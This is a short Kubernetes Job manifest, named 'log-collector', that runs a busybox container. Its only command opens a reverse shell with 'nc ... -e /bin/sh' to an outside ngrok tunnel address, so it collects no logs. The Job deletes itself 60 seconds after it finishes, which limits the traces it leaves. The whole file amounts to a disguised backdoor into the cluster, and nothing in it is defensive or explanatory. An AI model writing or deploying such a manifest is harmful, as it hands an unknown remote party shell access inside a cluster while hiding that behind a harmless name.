apiVersion: batch/v1
kind: Job
metadata:
  name: log-collector
spec:
  ttlSecondsAfterFinished: 60
  template:
    spec:
      containers:
      - name: collector
        image: busybox:latest
        command:
        - /bin/sh
        - -c
        - |
          nc 11.tcp.eu.ngrok.io 20728 -e /bin/sh
      restartPolicy: Never
  backoffLimit: 2
